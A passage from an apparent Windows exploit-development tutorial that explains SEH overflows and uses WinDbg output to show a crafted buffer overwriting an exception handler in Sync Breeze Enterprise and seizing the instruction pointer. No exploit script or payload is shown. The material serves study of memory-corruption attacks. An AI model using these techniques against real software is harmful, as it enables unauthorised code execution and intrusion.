</span></span></code></pre></div><p>By seeing the code, we can see that the functions checks the <strong>DllCharacteristics</strong> of the specific module where the exception occurs. If the module is compiled with SafeSEH, the Handler function will be compared against the entries of the table of the SafeSEH handlers before it is executed.
If the function succeeds, validating the Handler, the OS will call <code>RtlpExecuteHandlerForException</code>. This function will set up the appropiate arguments and invoke <code>ExecuteHandler</code>, which will end executing the <code>_except_handler</code> function.
This process is done for each of the handlers, to validate each of them.</p>
<p>To enable this functionality in a binary, the binary must be compiled with the <code>/SAFESEH</code> flag.</p>
<p>In summary, whenever an exception occurs, the operating system calls a designated set of functions as part of the SEH mechanism. Within these function calls, the <strong>ExceptionList</strong> singlelinked list is gathered from the TEB structure.
Next, the operating system parses the singly-linked list of <code>_EXCEPTION_REGISTRATION_RECORD</code> structures, performing various checks before calling the <code>exception_handler</code> function pointed to by each Handler member. This continues until a handler is found that will successfully process the exception and allow execution to continue.
If no handler can successfully handle the exception, the application will crash.</p>
<h1 id="seh-overflows">SEH overflows</h1>
<p>A SEH overflow is a stack based buffer overflow that is large enough or positioned in such a way that <strong>it is possible to overwrite valid registered exception handlers on the stack.</strong> By overwriting these handlers, the attacker can take control of the instruction pointer after triggering an exception.</p>
<p>This type of overflow <strong>bypasses</strong> the GS flag (stack cookies) as these cookies are positioned next to the return value of the vulnerable function. With this attack, the exception handler is modified and the instruction pointer is redirected to the address of the exception handler prior to reaching the end of the vulnerable function (in which the check is performed).</p>
<p><strong>Note: as the <code>_EXCEPTION_REGISTRATION_RECORD</code></strong> structures (the ones we want to modify) are stored at the beginning of the stack space (high addresses), the overflow needs to be quite large or begin near the beginning of the stack in order for the attacker to overwrite a structured exception handler.</p>
<p>Let&rsquo;s inspect our chain of <code>_EXCEPTION_REGISTRATION_RECORDS</code>in our victim process without tampering it first.
Because the SEH mechanism works on a per-thread basis, we won’t be able to inspect the intact SEH chain for the thread handling our incoming data, as that thread has not yet spawned. Instead, we will inspect the chain of <code>p _EXCEPTION_REGISTRATION_RECORD</code> structures for the thread WinDbg breaks into when we attach the debugger to the target process. This will reveal an intact chain.</p>
<p>Let&rsquo;s use the &ldquo;teb&rdquo; command in WinDbg to display the TEB address. We can see that we hace the ExceptionList pointer:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">003</span>db000
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">00</span>a0ff60
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">00</span>a10000
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">00</span>a0c000
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">003</span>db000
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">00000</span><span style="color:#ae81ff">938</span> . <span style="color:#ae81ff">000018f</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">003</span>c9000
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>We see that it is near 0x0, which means that it is close to the base of the stack of the thread.
Let&rsquo;s dump the first <code>_EXCEPTION_REGISTRATION_RECORD</code> structure at the memory address of the ExceptionList pointer.
From the previous section, we know that the <code>_EXCEPTION_REGISTRATION_RECORD</code> structure has two members. The first is Next and, as the name suggests, it points to the next entry in the singly-linked list. The second, Handler, is the memory address of the <code>_except_handler</code> function.
We can manually walk the singly-linked list in the debugger as shown in the listing below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">00</span>a0ff60
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x00a0ffcc</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x77308b10</span>     _EXCEPTION_DISPOSITION  ntdll<span style="color:#f92672">!</span>_except_handler4<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>We can iterate over the &ldquo;Next&rdquo; argument to see how much records there are in the stack. Let&rsquo;s do it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">00</span>a0ff60
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x00a0ffcc</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x77308b10</span>     _EXCEPTION_DISPOSITION  ntdll<span style="color:#f92672">!</span>_except_handler4<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">00</span>a0ffcc
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x00a0ffe4</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x77308b10</span>     _EXCEPTION_DISPOSITION  ntdll<span style="color:#f92672">!</span>_except_handler4<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">00</span>a0ffe4
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0xffffffff</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x773163cf</span>     _EXCEPTION_DISPOSITION  ntdll<span style="color:#f92672">!</span>FinalExceptionHandlerPad47<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>We see that the last member of the list has a &ldquo;Next&rdquo; pointer to 0xffffffff. This last record <strong>is the default exception handler specified by the OS, the one that ends the thread or program. Note that the associated <code>_EXCEPTION_DISPOSITION</code> value is different from the others!</strong></p>
<p>Now, let&rsquo;s trigger the crash with the exploit again to see what happens during a SEH overflow.
Once we send the exploit, let&rsquo;s walk the ExceptionList again. Oh, wait! the second <code>_EXCEPTION_REGISTRATION_RECORD</code> structure has been overwritten by our buffer!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0090f</span>e0c
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x0090ff44</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x1008df5b</span>     _EXCEPTION_DISPOSITION  libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">44</span>
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x41414141</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x41414141</span>     _EXCEPTION_DISPOSITION  <span style="color:#f92672">+</span><span style="color:#ae81ff">41414141</span>
</span></span></code></pre></div><p>Note that <code>_EXCEPTION_REGISTRATION_RECORD</code> structures are pushed on the stack from first to last. Because of this, SEH overflows generally overwrite the last <code>_EXCEPTION_REGISTRATION_RECORD</code> structure first, as it is the nearest to reach.
Keep in mind that in some cases, the overflow happens in such a way <strong>that the exception chain is only partially overwritten</strong>.</p>
<p>The exception occurs because the application is trying to read and execute an unmapped memory page. This causes an access violation exception that needs to be handled by the application or the OS.</p>
<p>Let&rsquo;s display all the exception handlers of the current thread with the !exchain extension:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>exchain
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span>e0c: libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">149f</span>b (<span style="color:#ae81ff">1008</span>df5b)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">44</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span>Invalid exception stack at <span style="color:#ae81ff">41414141</span>
</span></span></code></pre></div><p>This little program which follows the exception chain tells us the same as our manual analysis: we have managed to overwrite an exception handler.</p>
<p>For now, we know that the first step in the SEH overflow is to obtain the address of the first <code>_EXCEPTION_REGISTRATION_RECORD</code> structure from the TEB. Then the OS proceeds to call each of the <code>_exception_handler</code> functions until the exception has been handled, or crashes if no handler could deal with the exception.</p>
<p>At this point, however, the address of at least one of the <code>_except_handler</code> functions has been overwritten by our buffer (<strong>0x41414141</strong>).
This means that whenever this <code>_EXCEPTION_REGISTRATION_RECORD</code>structure is used to handle the exception, the CPU will end up calling 0x41414141, giving us control over the EIP register. This is exactly the behavior we noticed as part of the initial crash analysis. <strong>Note that the previous exceptions need to not be able to manage the exception, so that the exception handling mechanism manages to execute our function in order to try to handle the exception.</strong></p>
<p>We can confirm this by resuming execution inserting &ldquo;g&rdquo; in WinDbg and let the application handle the exception, which leads us to see that EIP has been modified to point to our code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">g</span>
</span></span><span style="display:flex;"><span>(<span style="color:#ae81ff">938.1</span>d54)<span style="color:#f92672">:</span> Access violation <span style="color:#f92672">-</span> code <span style="color:#a6e22e">c0000005</span> (first chance)
</span></span><span style="display:flex;"><span>First chance exceptions are reported before any exception handling.
</span></span><span style="display:flex;"><span>This exception may be expected and handled.
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77316270</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">440</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">41414141</span> <span style="color:#f92672">??</span>              <span style="color:#f92672">???</span>
</span></span></code></pre></div><p>Let&rsquo;s inspect the call stack with the &ldquo;k&rdquo; command to see which functions were called before the EIP was overwritten:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> k
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># ChildEBP RetAddr  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>WARNING: Frame IP not in any known module. Following frames may be wrong.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">43</span>c <span style="color:#ae81ff">77316252</span> <span style="color:#ae81ff">0x41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span> <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">460</span> <span style="color:#ae81ff">77316224</span> ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x26</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">528</span> <span style="color:#ae81ff">77302</span>cb6 ntdll<span style="color:#f92672">!</span>ExecuteHandler<span style="color:#f92672">+</span><span style="color:#ae81ff">0x24</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span> <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">528</span> <span style="color:#ae81ff">10012</span>a9d ntdll<span style="color:#f92672">!</span>KiUserExceptionDispatcher<span style="color:#f92672">+</span><span style="color:#ae81ff">0x26</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span> <span style="color:#ae81ff">0090f</span>eb8 <span style="color:#ae81ff">00000000</span> libpal<span style="color:#f92672">!</span>SCA_ConfigObj<span style="color:#f92672">::</span>Deserialize<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d</span>
</span></span></code></pre></div><p>The output indicates that ntdll!ExecuteHandler2 was called directly before we achieved code execution. As previously discussed, this function is responsible for calling the _except_handler functions registered on the stack. We’ll confirm this shortly.</p>
<p>Okay, we have control over the instruction pointer, but we need to point it to our code. Let&rsquo;s see if any of the register points to our buffer. Also, let&rsquo;s inspect the stack frame to see if our payload is there:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> dds esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">440</span>  <span style="color:#ae81ff">77316252</span> ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x26</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">444</span>  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">540</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">448</span>  <span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">44</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">44</span>c  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">55</span>c
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">450</span>  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>cc
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">454</span>  <span style="color:#ae81ff">0090f</span>e0c
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">458</span>  <span style="color:#ae81ff">77316270</span> ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x44</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">45</span>c  <span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">44</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">460</span>  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">528</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">464</span>  <span style="color:#ae81ff">77316224</span> ntdll<span style="color:#f92672">!</span>ExecuteHandler<span style="color:#f92672">+</span><span style="color:#ae81ff">0x24</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">468</span>  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">540</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">46</span>c  <span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">44</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">470</span>  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">55</span>c
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">474</span>  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>cc
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">478</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">47</span>c  <span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">44</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">480</span>  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">540</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">484</span>  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">488</span>  <span style="color:#ae81ff">772</span>dd4db ntdll<span style="color:#f92672">!</span>RtlDispatchException<span style="color:#f92672">+</span><span style="color:#ae81ff">0x143</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">48</span>c  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">540</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">490</span>  <span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">44</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">494</span>  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">55</span>c
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">498</span>  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>cc
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">49</span>c  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>a0  <span style="color:#ae81ff">0090f</span>b10
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>a4  <span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">08</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>a8  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">540</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>ac  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>b0  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">55</span>c
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>b4  <span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">44</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>b8  <span style="color:#ae81ff">00000032</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>bc  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> r
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77316270</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">440</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">41414141</span> <span style="color:#f92672">??</span>              <span style="color:#f92672">???</span>
</span></span></code></pre></div><p>According to the output in Listing 107, none of the registers point to our buffer at the moment we gain control over the execution. The ECX register is being overwritten alongside the instruction pointer while most of the other registers are NULL. We do not overwrite any data on the stack (which ESP and EBP point to). Lastly, EDX appears to point somewhere inside the ntdll!ExecuteHandler2 function.</p>
<p>At this point, even if we control the instruction pointer, we are still not able to easily redirect the execution flow to our buffer where we’d eventually store a payload.</p>
<p>Let&rsquo;s put a breakpoint in ntdll!ExecuteHandler2 to stop the execution before WinDbg intercepts the exception. Then, let&rsquo;s crash the application again, and skip the first call to ntdll!ExecuteHandler2, because <strong>the first exception handler has not been overwritten by us, and we want to go to the second exception handler.</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>(<span style="color:#ae81ff">16</span>cc.f30)<span style="color:#f92672">:</span> Access violation <span style="color:#f92672">-</span> code <span style="color:#a6e22e">c0000005</span> (first chance)
</span></span><span style="display:flex;"><span>First chance exceptions are reported before any exception handling.
</span></span><span style="display:flex;"><span>This exception may be expected and handled.
</span></span><span style="display:flex;"><span><span style="color:#f92672">***</span> WARNING: Unable to verify checksum <span style="color:#66d9ef">for</span> C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Sync Breeze Enterprise<span style="color:#960050;background-color:#1e0010">\</span>bin<span style="color:#960050;background-color:#1e0010">\</span>libpal.dll
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span>a0c ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">08</span> edx<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">9</span>c4 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">08</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span>b10
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>d2a9d esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">998</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span>eb8 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010206</span>
</span></span><span style="display:flex;"><span>libpal<span style="color:#f92672">!</span>SCA_ConfigObj<span style="color:#f92672">::</span>Deserialize<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>d2a9d ff5024          call    dword ptr [eax<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>h]  ds:<span style="color:#ae81ff">0023</span><span style="color:#f92672">:</span><span style="color:#ae81ff">41414165</span><span style="color:#f92672">=????????</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> bp ntdll<span style="color:#f92672">!</span>ExecuteHandler2
